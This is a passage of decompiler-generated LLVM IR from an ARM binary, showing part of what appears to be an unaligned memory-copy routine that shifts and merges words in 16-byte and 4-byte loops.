    i2 -1, label %dec_label_pc_15db0
    i2 -2, label %dec_label_pc_15d44
  ]

dec_label_pc_15cd8:                               ; preds = %dec_label_pc_15cc4
  br i1 %v5_15db4, label %dec_label_pc_15d24, label %dec_label_pc_15ce0

dec_label_pc_15ce0:                               ; preds = %dec_label_pc_15cd8
  store i32 %v2_15db0, i32* %r2.global-to-local, align 4
  %v3_15ce4 = load i32, i32* @r4, align 4
  store i32 %v3_15ce4, i32* %stack_var_-16, align 4
  %v6_15ce4 = load i32, i32* @r5, align 4
  store i32 %v6_15ce4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15ce8

dec_label_pc_15ce8:                               ; preds = %dec_label_pc_15ce8.dec_label_pc_15ce8_crit_edge, %dec_label_pc_15ce0
  %v0_15d0c = phi i32 [ %v12_15d0c, %dec_label_pc_15ce8.dec_label_pc_15ce8_crit_edge ], [ %v0_15d0c75, %dec_label_pc_15ce0 ]
  %v0_15cec = phi i32 [ %v0_15cec.pre, %dec_label_pc_15ce8.dec_label_pc_15ce8_crit_edge ], [ %v4_15cc8, %dec_label_pc_15ce0 ]
  %v0_15ce8 = phi i32 [ %v0_15ce8.pre, %dec_label_pc_15ce8.dec_label_pc_15ce8_crit_edge ], [ %v2_15cc8, %dec_label_pc_15ce0 ]
  %v3_15ce8 = udiv i32 %v0_15ce8, 256
  store i32 %v3_15ce8, i32* %r3.global-to-local, align 4
  %v1_15cec = inttoptr i32 %v0_15cec to i32*
  %v2_15cec = load i32, i32* %v1_15cec, align 4
  store i32 %v2_15cec, i32* %r4.global-to-local, align 4
  %v3_15cec = add i32 %v0_15cec, 4
  %v4_15cec = inttoptr i32 %v3_15cec to i32*
  %v5_15cec = load i32, i32* %v4_15cec, align 4
  store i32 %v5_15cec, i32* %r5.global-to-local, align 4
  %v6_15cec = add i32 %v0_15cec, 8
  %v7_15cec = inttoptr i32 %v6_15cec to i32*
  %v8_15cec = load i32, i32* %v7_15cec, align 4
  store i32 %v8_15cec, i32* %ip.global-to-local, align 4
  %v9_15cec = add i32 %v0_15cec, 12
  %v10_15cec = inttoptr i32 %v9_15cec to i32*
  %v11_15cec = load i32, i32* %v10_15cec, align 4
  store i32 %v11_15cec, i32* @lr, align 4
  %v12_15cec = add i32 %v0_15cec, 16
  store i32 %v12_15cec, i32* %r1.global-to-local, align 4
  %v4_15cf0 = mul i32 %v2_15cec, 16777216
  %v5_15cf0 = or i32 %v4_15cf0, %v3_15ce8
  store i32 %v5_15cf0, i32* %r3.global-to-local, align 4
  %v3_15cf4 = udiv i32 %v2_15cec, 256
  %v4_15cf8 = mul i32 %v5_15cec, 16777216
  %v5_15cf8 = or i32 %v4_15cf8, %v3_15cf4
  store i32 %v5_15cf8, i32* %r4.global-to-local, align 4
  %v3_15cfc = udiv i32 %v5_15cec, 256
  %v4_15d00 = mul i32 %v8_15cec, 16777216
  %v5_15d00 = or i32 %v4_15d00, %v3_15cfc
  store i32 %v5_15d00, i32* %r5.global-to-local, align 4
  %v3_15d04 = udiv i32 %v8_15cec, 256
  %v4_15d08 = mul i32 %v11_15cec, 16777216
  %v5_15d08 = or i32 %v4_15d08, %v3_15d04
  store i32 %v5_15d08, i32* %ip.global-to-local, align 4
  %v1_15d0c = inttoptr i32 %v0_15d0c to i32*
  store i32 %v5_15cf0, i32* %v1_15d0c, align 4
  %v3_15d0c = add i32 %v0_15d0c, 4
  %v4_15d0c = inttoptr i32 %v3_15d0c to i32*
  %v5_15d0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15d0c, i32* %v4_15d0c, align 4
  %v6_15d0c = add i32 %v0_15d0c, 8
  %v7_15d0c = inttoptr i32 %v6_15d0c to i32*
  %v8_15d0c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15d0c, i32* %v7_15d0c, align 4
  %v9_15d0c = add i32 %v0_15d0c, 12
  %v10_15d0c = inttoptr i32 %v9_15d0c to i32*
  %v11_15d0c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_15d0c, i32* %v10_15d0c, align 4
  %v12_15d0c = add i32 %v0_15d0c, 16
  store i32 %v12_15d0c, i32* %r0.global-to-local, align 4
  %v0_15d10 = load i32, i32* %r2.global-to-local, align 4
  %v2_15d10 = add i32 %v0_15d10, -16
  store i32 %v2_15d10, i32* %r2.global-to-local, align 4
  %v6_15d14 = icmp slt i32 %v0_15d10, 16
  br i1 %v6_15d14, label %dec_label_pc_15d18, label %dec_label_pc_15ce8.dec_label_pc_15ce8_crit_edge

dec_label_pc_15ce8.dec_label_pc_15ce8_crit_edge:  ; preds = %dec_label_pc_15ce8
  %v0_15ce8.pre = load i32, i32* @lr, align 4
  %v0_15cec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15ce8

dec_label_pc_15d18:                               ; preds = %dec_label_pc_15ce8
  %v2_15d18 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15d18, i32* @r4, align 4
  %v5_15d18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15d18, i32* @r5, align 4
  %v2_15d1c = add i32 %v0_15d10, -4
  store i32 %v2_15d1c, i32* %r2.global-to-local, align 4
  %v4_15d1c = add i32 %v0_15d10, 2147483632
  %v5_15d1c = and i32 %v2_15d1c, %v4_15d1c
  %v6_15d1c = icmp slt i32 %v5_15d1c, 0
  store i1 %v6_15d1c, i1* %cpsr_v.global-to-local, align 1
  %v7_15d1c = icmp slt i32 %v2_15d1c, 0
  store i1 %v7_15d1c, i1* %cpsr_n.global-to-local, align 1
  %v5_15d20 = icmp slt i32 %v2_15d10, -12
  br i1 %v5_15d20, label %dec_label_pc_15d3c, label %dec_label_pc_15d24

dec_label_pc_15d24:                               ; preds = %dec_label_pc_15d18, %dec_label_pc_15cd8, %dec_label_pc_15d24
  %v1_15d30 = phi i32 [ %v4_15d30, %dec_label_pc_15d24 ], [ %v12_15d0c, %dec_label_pc_15d18 ], [ %v0_15d0c75, %dec_label_pc_15cd8 ]
  %v0_15d24 = load i32, i32* @lr, align 4
  %v3_15d24 = udiv i32 %v0_15d24, 256
  store i32 %v3_15d24, i32* %ip.global-to-local, align 4
  %v0_15d28 = load i32, i32* %r1.global-to-local, align 4
  %v1_15d28 = inttoptr i32 %v0_15d28 to i32*
  %v2_15d28 = load i32, i32* %v1_15d28, align 4
  store i32 %v2_15d28, i32* @lr, align 4
  %v4_15d28 = add i32 %v0_15d28, 4
  store i32 %v4_15d28, i32* %r1.global-to-local, align 4
  %v4_15d2c = mul i32 %v2_15d28, 16777216
  %v5_15d2c = or i32 %v4_15d2c, %v3_15d24
  store i32 %v5_15d2c, i32* %ip.global-to-local, align 4
  %v2_15d30 = inttoptr i32 %v1_15d30 to i32*
  store i32 %v5_15d2c, i32* %v2_15d30, align 4
  %v3_15d30 = load i32, i32* %r0.global-to-local, align 4
  %v4_15d30 = add i32 %v3_15d30, 4
  store i32 %v4_15d30, i32* %r0.global-to-local, align 4
  %v0_15d34 = load i32, i32* %r2.global-to-local, align 4
  %v2_15d34 = add i32 %v0_15d34, -4
  store i32 %v2_15d34, i32* %r2.global-to-local, align 4
  %v6_15d38 = icmp slt i32 %v0_15d34, 4
  br i1 %v6_15d38, label %dec_label_pc_15d3c.loopexit, label %dec_label_pc_15d24

dec_label_pc_15d3c.loopexit:                      ; preds = %dec_label_pc_15d24
  %v4_15d34 = sub i32 3, %v0_15d34
  %v5_15d34 = and i32 %v4_15d34, %v0_15d34
  %v6_15d34 = icmp slt i32 %v5_15d34, 0
  %v7_15d34 = icmp slt i32 %v2_15d34, 0
  store i1 %v6_15d34, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15d34, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15d3c

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15d3c.loopexit, %dec_label_pc_15d18
  %v2_15c7c114 = phi i32 [ %v4_15d30, %dec_label_pc_15d3c.loopexit ], [ %v12_15d0c, %dec_label_pc_15d18 ]
  %v0_15c6c110 = phi i32 [ %v2_15d34, %dec_label_pc_15d3c.loopexit ], [ %v2_15d1c, %dec_label_pc_15d18 ]
  %v0_15d3c = load i32, i32* %r1.global-to-local, align 4
  %v1_15d3c = add i32 %v0_15d3c, -3
  store i32 %v1_15d3c, i32* %r1.global-to-local, align 4
  br label %bb133

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15cc4
  br i1 %v5_15db4, label %dec_label_pc_15d90, label %dec_label_pc_15d4c

dec_label_pc_15d4c:                               ; preds = %dec_label_pc_15d44
  store i32 %v2_15db0, i32* %r2.global-to-local, align 4
  %v3_15d50 = load i32, i32* @r4, align 4
  store i32 %v3_15d50, i32* %stack_var_-16, align 4
  %v6_15d50 = load i32, i32* @r5, align 4
  store i32 %v6_15d50, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15d54

dec_label_pc_15d54:                               ; preds = %dec_label_pc_15d54.dec_label_pc_15d54_crit_edge, %dec_label_pc_15d4c
  %v0_15d78 = phi i32 [ %v12_15d78, %dec_label_pc_15d54.dec_label_pc_15d54_crit_edge ], [ %v0_15d0c75, %dec_label_pc_15d4c ]
  %v0_15d58 = phi i32 [ %v0_15d58.pre, %dec_label_pc_15d54.dec_label_pc_15d54_crit_edge ], [ %v4_15cc8, %dec_label_pc_15d4c ]
  %v0_15d54 = phi i32 [ %v0_15d54.pre, %dec_label_pc_15d54.dec_label_pc_15d54_crit_edge ], [ %v2_15cc8, %dec_label_pc_15d4c ]
  %v3_15d54 = udiv i32 %v0_15d54, 65536
  store i32 %v3_15d54, i32* %r3.global-to-local, align 4
  %v1_15d58 = inttoptr i32 %v0_15d58 to i32*
  %v2_15d58 = load i32, i32* %v1_15d58, align 4
  store i32 %v2_15d58, i32* %r4.global-to-local, align 4
  %v3_15d58 = add i32 %v0_15d58, 4
  %v4_15d58 = inttoptr i32 %v3_15d58 to i32*
  %v5_15d58 = load i32, i32* %v4_15d58, align 4
  store i32 %v5_15d58, i32* %r5.global-to-local, align 4
  %v6_15d58 = add i32 %v0_15d58, 8
  %v7_15d58 = inttoptr i32 %v6_15d58 to i32*
  %v8_15d58 = load i32, i32* %v7_15d58, align 4
  store i32 %v8_15d58, i32* %ip.global-to-local, align 4
  %v9_15d58 = add i32 %v0_15d58, 12
  %v10_15d58 = inttoptr i32 %v9_15d58 to i32*
  %v11_15d58 = load i32, i32* %v10_15d58, align 4
  store i32 %v11_15d58, i32* @lr, align 4
  %v12_15d58 = add i32 %v0_15d58, 16
  store i32 %v12_15d58, i32* %r1.global-to-local, align 4
  %v4_15d5c = mul i32 %v2_15d58, 65536
  %v5_15d5c = or i32 %v4_15d5c, %v3_15d54
  store i32 %v5_15d5c, i32* %r3.global-to-local, align 4
  %v3_15d60 = udiv i32 %v2_15d58, 65536
  %v4_15d64 = mul i32 %v5_15d58, 65536
  %v5_15d64 = or i32 %v4_15d64, %v3_15d60
  store i32 %v5_15d64, i32* %r4.global-to-local, align 4
  %v3_15d68 = udiv i32 %v5_15d58, 65536
  %v4_15d6c = mul i32 %v8_15d58, 65536
  %v5_15d6c = or i32 %v4_15d6c, %v3_15d68
  store i32 %v5_15d6c, i32* %r5.global-to-local, align 4
  %v3_15d70 = udiv i32 %v8_15d58, 65536
  %v4_15d74 = mul i32 %v11_15d58, 65536
  %v5_15d74 = or i32 %v4_15d74, %v3_15d70
  store i32 %v5_15d74, i32* %ip.global-to-local, align 4
  %v1_15d78 = inttoptr i32 %v0_15d78 to i32*
  store i32 %v5_15d5c, i32* %v1_15d78, align 4
  %v3_15d78 = add i32 %v0_15d78, 4
  %v4_15d78 = inttoptr i32 %v3_15d78 to i32*
  %v5_15d78 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15d78, i32* %v4_15d78, align 4
  %v6_15d78 = add i32 %v0_15d78, 8
  %v7_15d78 = inttoptr i32 %v6_15d78 to i32*
  %v8_15d78 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15d78, i32* %v7_15d78, align 4
  %v9_15d78 = add i32 %v0_15d78, 12
  %v10_15d78 = inttoptr i32 %v9_15d78 to i32*
  %v11_15d78 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_15d78, i32* %v10_15d78, align 4
  %v12_15d78 = add i32 %v0_15d78, 16
  store i32 %v12_15d78, i32* %r0.global-to-local, align 4
  %v0_15d7c = load i32, i32* %r2.global-to-local, align 4
  %v2_15d7c = add i32 %v0_15d7c, -16
  store i32 %v2_15d7c, i32* %r2.global-to-local, align 4
  %v6_15d80 = icmp slt i32 %v0_15d7c, 16
  br i1 %v6_15d80, label %dec_label_pc_15d84, label %dec_label_pc_15d54.dec_label_pc_15d54_crit_edge

dec_label_pc_15d54.dec_label_pc_15d54_crit_edge:  ; preds = %dec_label_pc_15d54
  %v0_15d54.pre = load i32, i32* @lr, align 4
  %v0_15d58.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15d54

dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d54
  %v2_15d84 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15d84, i32* @r4, align 4
  %v5_15d84 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15d84, i32* @r5, align 4
  %v2_15d88 = add i32 %v0_15d7c, -4
  store i32 %v2_15d88, i32* %r2.global-to-local, align 4
  %v4_15d88 = add i32 %v0_15d7c, 2147483632
  %v5_15d88 = and i32 %v2_15d88, %v4_15d88
  %v6_15d88 = icmp slt i32 %v5_15d88, 0
  store i1 %v6_15d88, i1* %cpsr_v.global-to-local, align 1
  %v7_15d88 = icmp slt i32 %v2_15d88, 0
  store i1 %v7_15d88, i1* %cpsr_n.global-to-local, align 1
  %v5_15d8c = icmp slt i32 %v2_15d7c, -12
  br i1 %v5_15d8c, label %dec_label_pc_15da8, label %dec_label_pc_15d90

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d44, %dec_label_pc_15d84, %dec_label_pc_15d90
  %v1_15d9c = phi i32 [ %v4_15d9c, %dec_label_pc_15d90 ], [ %v0_15d0c75, %dec_label_pc_15d44 ], [ %v12_15d78, %dec_label_pc_15d84 ]
  %v0_15d90 = load i32, i32* @lr, align 4
  %v3_15d90 = udiv i32 %v0_15d90, 65536
  store i32 %v3_15d90, i32* %ip.global-to-local, align 4
  %v0_15d94 = load i32, i32* %r1.global-to-local, align 4
  %v1_15d94 = inttoptr i32 %v0_15d94 to i32*
  %v2_15d94 = load i32, i32* %v1_15d94, align 4
  store i32 %v2_15d94, i32* @lr, align 4
  %v4_15d94 = add i32 %v0_15d94, 4
  store i32 %v4_15d94, i32* %r1.global-to-local, align 4
  %v4_15d98 = mul i32 %v2_15d94, 65536
  %v5_15d98 = or i32 %v4_15d98, %v3_15d90
  store i32 %v5_15d98, i32* %ip.global-to-local, align 4
  %v2_15d9c = inttoptr i32 %v1_15d9c to i32*
  store i32 %v5_15d98, i32* %v2_15d9c, align 4
  %v3_15d9c = load i32, i32* %r0.global-to-local, align 4
  %v4_15d9c = add i32 %v3_15d9c, 4
  store i32 %v4_15d9c, i32* %r0.global-to-local, align 4
  %v0_15da0 = load i32, i32* %r2.global-to-local, align 4
  %v2_15da0 = add i32 %v0_15da0, -4
  store i32 %v2_15da0, i32* %r2.global-to-local, align 4
  %v6_15da4 = icmp slt i32 %v0_15da0, 4
  br i1 %v6_15da4, label %dec_label_pc_15da8.loopexit, label %dec_label_pc_15d90

dec_label_pc_15da8.loopexit:                      ; preds = %dec_label_pc_15d90
  %v4_15da0 = sub i32 3, %v0_15da0
  %v5_15da0 = and i32 %v4_15da0, %v0_15da0
  %v6_15da0 = icmp slt i32 %v5_15da0, 0
  %v7_15da0 = icmp slt i32 %v2_15da0, 0
  store i1 %v6_15da0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15da0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15da8

dec_label_pc_15da8:                               ; preds = %dec_label_pc_15da8.loopexit, %dec_label_pc_15d84
  %v2_15c7c112 = phi i32 [ %v4_15d9c, %dec_label_pc_15da8.loopexit ], [ %v12_15d78, %dec_label_pc_15d84 ]
  %v0_15c6c108 = phi i32 [ %v2_15da0, %dec_label_pc_15da8.loopexit ], [ %v2_15d88, %dec_label_pc_15d84 ]
  %v0_15da8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15da8 = add i32 %v0_15da8, -2
  store i32 %v1_15da8, i32* %r1.global-to-local, align 4
  br label %bb133

dec_label_pc_15db0:                               ; preds = %dec_label_pc_15cc4
  br i1 %v5_15db4, label %dec_label_pc_15dfc, label %dec_label_pc_15db8

dec_label_pc_15db8:                               ; preds = %dec_label_pc_15db0
  store i32 %v2_15db0, i32* %r2.global-to-local, align 4
  %v3_15dbc = load i32, i32* @r4, align 4
  store i32 %v3_15dbc, i32* %stack_var_-16, align 4
  %v6_15dbc = load i32, i32* @r5, align 4
  store i32 %v6_15dbc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15dc0

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15dc0.dec_label_pc_15dc0_crit_edge, %dec_label_pc_15db8
  %v0_15de4 = phi i32 [ %v12_15de4, %dec_label_pc_15dc0.dec_label_pc_15dc0_crit_edge ], [ %v0_15d0c75, %dec_label_pc_15db8 ]
  %v0_15dc4 = phi i32 [ %v0_15dc4.pre, %dec_label_pc_15dc0.dec_label_pc_15dc0_crit_edge ], [ %v4_15cc8, %dec_label_pc_15db8 ]
  %v0_15dc0 = phi i32 [ %v0_15dc0.pre, %dec_label_pc_15dc0.dec_label_pc_15dc0_crit_edge ], [ %v2_15cc8, %dec_label_pc_15db8 ]
  %v3_15dc0 = udiv i32 %v0_15dc0, 16777216
  store i32 %v3_15dc0, i32* %r3.global-to-local, align 4
  %v1_15dc4 = inttoptr i32 %v0_15dc4 to i32*
  %v2_15dc4 = load i32, i32* %v1_15dc4, align 4
  store i32 %v2_15dc4, i32* %r4.global-to-local, align 4
  %v3_15dc4 = add i32 %v0_15dc4, 4
  %v4_15dc4 = inttoptr i32 %v3_15dc4 to i32*
  %v5_15dc4 = load i32, i32* %v4_15dc4, align 4
  store i32 %v5_15dc4, i32* %r5.global-to-local, align 4
  %v6_15dc4 = add i32 %v0_15dc4, 8
  %v7_15dc4 = inttoptr i32 %v6_15dc4 to i32*
  %v8_15dc4 = load i32, i32* %v7_15dc4, align 4
  store i32 %v8_15dc4, i32* %ip.global-to-local, align 4
  %v9_15dc4 = add i32 %v0_15dc4, 12
  %v10_15dc4 = inttoptr i32 %v9_15dc4 to i32*
  %v11_15dc4 = load i32, i32* %v10_15dc4, align 4
  store i32 %v11_15dc4, i32* @lr, align 4
  %v12_15dc4 = add i32 %v0_15dc4, 16
  store i32 %v12_15dc4, i32* %r1.global-to-local, align 4
  %v4_15dc8 = mul i32 %v2_15dc4, 256
  %v5_15dc8 = or i32 %v4_15dc8, %v3_15dc0
  store i32 %v5_15dc8, i32* %r3.global-to-local, align 4
  %v3_15dcc = udiv i32 %v2_15dc4, 16777216
  %v4_15dd0 = mul i32 %v5_15dc4, 256
  %v5_15dd0 = or i32 %v4_15dd0, %v3_15dcc
  store i32 %v5_15dd0, i32* %r4.global-to-local, align 4
  %v3_15dd4 = udiv i32 %v5_15dc4, 16777216
  %v4_15dd8 = mul i32 %v8_15dc4, 256
  %v5_15dd8 = or i32 %v4_15dd8, %v3_15dd4
  store i32 %v5_15dd8, i32* %r5.global-to-local, align 4
  %v3_15ddc = udiv i32 %v8_15dc4, 16777216
  %v4_15de0 = mul i32 %v11_15dc4, 256
  %v5_15de0 = or i32 %v4_15de0, %v3_15ddc
  store i32 %v5_15de0, i32* %ip.global-to-local, align 4
  %v1_15de4 = inttoptr i32 %v0_15de4 to i32*
  store i32 %v5_15dc8, i32* %v1_15de4, align 4
  %v3_15de4 = add i32 %v0_15de4, 4
  %v4_15de4 = inttoptr i32 %v3_15de4 to i32*
  %v5_15de4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15de4, i32* %v4_15de4, align 4
  %v6_15de4 = add i32 %v0_15de4, 8
  %v7_15de4 = inttoptr i32 %v6_15de4 to i32*
  %v8_15de4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15de4, i32* %v7_15de4, align 4
  %v9_15de4 = add i32 %v0_15de4, 12
  %v10_15de4 = inttoptr i32 %v9_15de4 to i32*
  %v11_15de4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_15de4, i32* %v10_15de4, align 4
  %v12_15de4 = add i32 %v0_15de4, 16
  store i32 %v12_15de4, i32* %r0.global-to-local, align 4
  %v0_15de8 = load i32, i32* %r2.global-to-local, align 4
  %v2_15de8 = add i32 %v0_15de8, -16
  store i32 %v2_15de8, i32* %r2.global-to-local, align 4
  %v6_15dec = icmp slt i32 %v0_15de8, 16
  br i1 %v6_15dec, label %dec_label_pc_15df0, label %dec_label_pc_15dc0.dec_label_pc_15dc0_crit_edge

dec_label_pc_15dc0.dec_label_pc_15dc0_crit_edge:  ; preds = %dec_label_pc_15dc0
  %v0_15dc0.pre = load i32, i32* @lr, align 4
  %v0_15dc4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15dc0

dec_label_pc_15df0:                               ; preds = %dec_label_pc_15dc0
  %v2_15df0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15df0, i32* @r4, align 4
  %v5_15df0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15df0, i32* @r5, align 4
  %v2_15df4 = add i32 %v0_15de8, -4
  store i32 %v2_15df4, i32* %r2.global-to-local, align 4
  %v4_15df4 = add i32 %v0_15de8, 2147483632
  %v5_15df4 = and i32 %v2_15df4, %v4_15df4
  %v6_15df4 = icmp slt i32 %v5_15df4, 0
  store i1 %v6_15df4, i1* %cpsr_v.global-to-local, align 1
  %v7_15df4 = icmp slt i32 %v2_15df4, 0
  store i1 %v7_15df4, i1* %cpsr_n.global-to-local, align 1
  %v5_15df8 = icmp slt i32 %v2_15de8, -12
  br i1 %v5_15df8, label %dec_label_pc_15e14, label %dec_label_pc_15dfc

dec_label_pc_15dfc:                               ; preds = %dec_label_pc_15df0, %dec_label_pc_15db0, %dec_label_pc_15dfc
  %v1_15e08 = phi i32 [ %v4_15e08, %dec_label_pc_15dfc ], [ %v12_15de4, %dec_label_pc_15df0 ], [ %v0_15d0c75, %dec_label_pc_15db0 ]
  %v0_15dfc = load i32, i32* @lr, align 4
  %v3_15dfc = udiv i32 %v0_15dfc, 16777216
  store i32 %v3_15dfc, i32* %ip.global-to-local, align 4
  %v0_15e00 = load i32, i32* %r1.global-to-local, align 4
  %v1_15e00 = inttoptr i32 %v0_15e00 to i32*
  %v2_15e00 = load i32, i32* %v1_15e00, align 4
  store i32 %v2_15e00, i32* @lr, align 4
  %v4_15e00 = add i32 %v0_15e00, 4
  store i32 %v4_15e00, i32* %r1.global-to-local, align 4
  %v4_15e04 = mul i32 %v2_15e00, 256
  %v5_15e04 = or i32 %v4_15e04, %v3_15dfc
  store i32 %v5_15e04, i32* %ip.global-to-local, align 4
  %v2_15e08 = inttoptr i32 %v1_15e08 to i32*
  store i32 %v5_15e04, i32* %v2_15e08, align 4
  %v3_15e08 = load i32, i32* %r0.global-to-local, align 4
  %v4_15e08 = add i32 %v3_15e08, 4
  store i32 %v4_15e08, i32* %r0.global-to-local, align 4
  %v0_15e0c = load i32, i32* %r2.global-to-local, align 4
  %v2_15e0c = add i32 %v0_15e0c, -4
  store i32 %v2_15e0c, i32* %r2.global-to-local, align 4
  %v6_15e10 = icmp slt i32 %v0_15e0c, 4
  br i1 %v6_15e10, label %dec_label_pc_15e14.loopexit, label %dec_label_pc_15dfc

dec_label_pc_15e14.loopexit:                      ; preds = %dec_label_pc_15dfc
  %v4_15e0c = sub i32 3, %v0_15e0c
  %v5_15e0c = and i32 %v4_15e0c, %v0_15e0c
  %v6_15e0c = icmp slt i32 %v5_15e0c, 0
  %v7_15e0c = icmp slt i32 %v2_15e0c, 0
  store i1 %v6_15e0c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15e0c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15e14

dec_label_pc_15e14:                               ; preds = %dec_label_pc_15e14.loopexit, %dec_label_pc_15df0
  %v2_15c7c113 = phi i32 [ %v4_15e08, %dec_label_pc_15e14.loopexit ], [ %v12_15de4, %dec_label_pc_15df0 ]
  %v0_15c6c109 = phi i32 [ %v2_15e0c, %dec_label_pc_15e14.loopexit ], [ %v2_15df4, %dec_label_pc_15df0 ]
  %v0_15e14 = load i32, i32* %r1.global-to-local, align 4
  %v1_15e14 = add i32 %v0_15e14, -1
  store i32 %v1_15e14, i32* %r1.global-to-local, align 4
  br label %bb133

dec_label_pc_15e1c:                               ; preds = %entry
  %v1_15e1c = load i32, i32* @r2, align 4
  %v2_15e1c = add i32 %v1_15e1c, %v0_15bd0
  store i32 %v2_15e1c, i32* %r1.global-to-local, align 4
  %v2_15e20 = add i32 %v1_15e1c, %v1_15bd0
  store i32 %v2_15e20, i32* %r0.global-to-local, align 4
  %v2_15e24 = add i32 %v1_15e1c, -4
  store i32 %v2_15e24, i32* %r2.global-to-local, align 4
  %v4_15e24 = sub i32 3, %v1_15e1c
  %v5_15e24 = and i32 %v4_15e24, %v1_15e1c
  %v6_15e24 = icmp slt i32 %v5_15e24, 0
  store i1 %v6_15e24, i1* %cpsr_v.global-to-local, align 1
  %v7_15e24 = icmp slt i32 %v2_15e24, 0
  store i1 %v7_15e24, i1* %cpsr_n.global-to-local, align 1
  %v5_15e28 = icmp slt i32 %v1_15e1c, 4
  br i1 %v5_15e28, label %bb143, label %dec_label_pc_15e2c

dec_label_pc_15e2c:                               ; preds = %dec_label_pc_15e1c
  %v1_15e2c = urem i32 %v2_15e20, 4
  store i32 %v1_15e2c, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15e2c = icmp eq i32 %v1_15e2c, 0
  br i1 %v2_15e2c, label %dec_label_pc_15e34, label %dec_label_pc_15ed4

dec_label_pc_15e34:                               ; preds = %dec_label_pc_15e2c
  %v1_15e34 = urem i32 %v2_15e1c, 4
  store i32 %v1_15e34, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15e34 = icmp eq i32 %v1_15e34, 0
  br i1 %v2_15e34, label %dec_label_pc_15e3c, label %dec_label_pc_15f00

dec_label_pc_15e3c:                               ; preds = %dec_label_pc_15e34, %dec_label_pc_15ef8
  %v0_15e5449 = phi i32 [ %v2_15e20, %dec_label_pc_15e34 ], [ %v0_15f4832, %dec_label_pc_15ef8 ]
  %v0_15e5048 = phi i32 [ %v2_15e1c, %dec_label_pc_15e34 ], [ %v0_15ef8, %dec_label_pc_15ef8 ]
  %v0_15e3c = phi i32 [ %v2_15e24, %dec_label_pc_15e34 ], [ %v2_15ef0, %dec_label_pc_15ef8 ]
  %v2_15e3c = add i32 %v0_15e3c, -8
  store i32 %v2_15e3c, i32* %r2.global-to-local, align 4
  %v4_15e3c = sub i32 7, %v0_15e3c
  %v5_15e3c = and i32 %v4_15e3c, %v0_15e3c
  %v6_15e3c = icmp slt i32 %v5_15e3c, 0
  store i1 %v6_15e3c, i1* %cpsr_v.global-to-local, align 1
  %v7_15e3c = icmp slt i32 %v2_15e3c, 0
  store i1 %v7_15e3c, i1* %cpsr_n.global-to-local, align 1
  %v5_15e40 = icmp slt i32 %v0_15e3c, 8
  br i1 %v5_15e40, label %dec_label_pc_15e8c, label %dec_label_pc_15e44

dec_label_pc_15e44:                               ; preds = %dec_label_pc_15e3c
  %v3_15e44 = load i32, i32* @r4, align 4
  %v5_15e44 = inttoptr i32 %v3_15e44 to i8*
  store i8* %v5_15e44, i8** %stack_var_-8, align 4
  %v8_15e44 = load i32, i32* @lr, align 4
  %v2_15e48 = add i32 %v0_15e3c, -28
  store i32 %v2_15e48, i32* %r2.global-to-local, align 4
  %v4_15e48 = sub i32 27, %v0_15e3c
  %v5_15e48 = and i32 %v4_15e48, %v2_15e3c
  %v6_15e48 = icmp slt i32 %v5_15e48, 0
  store i1 %v6_15e48, i1* %cpsr_v.global-to-local, align 1
  %v7_15e48 = icmp slt i32 %v2_15e48, 0
  store i1 %v7_15e48, i1* %cpsr_n.global-to-local, align 1
  %v5_15e4c = icmp slt i32 %v2_15e3c, 20
  br i1 %v5_15e4c, label %dec_label_pc_15e68, label %dec_label_pc_15e50

dec_label_pc_15e50:                               ; preds = %dec_label_pc_15e44, %dec_label_pc_15e50.dec_label_pc_15e50_crit_edge
  %v0_15e54 = phi i32 [ %v1_15e5c, %dec_label_pc_15e50.dec_label_pc_15e50_crit_edge ], [ %v0_15e5449, %dec_label_pc_15e44 ]
  %v0_15e50 = phi i32 [ %v0_15e50.pre, %dec_label_pc_15e50.dec_label_pc_15e50_crit_edge ], [ %v0_15e5048, %dec_label_pc_15e44 ]
  %v1_15e50 = add i32 %v0_15e50, -4
  %v2_15e50 = inttoptr i32 %v1_15e50 to i32*
  %v3_15e50 = load i32, i32* %v2_15e50, align 4
  store i32 %v3_15e50, i32* %r3.global-to-local, align 4
  %v4_15e50 = add i32 %v0_15e50, -8
  %v5_15e50 = inttoptr i32 %v4_15e50 to i32*
  %v6_15e50 = load i32, i32* %v5_15e50, align 4
  store i32 %v6_15e50, i32* %r4.global-to-local, align 4
  %v7_15e50 = add i32 %v0_15e50, -12
  %v8_15e50 = inttoptr i32 %v7_15e50 to i32*
  %v9_15e50 = load i32, i32* %v8_15e50, align 4
  store i32 %v9_15e50, i32* %ip.global-to-local, align 4
  %v10_15e50 = add i32 %v0_15e50, -16
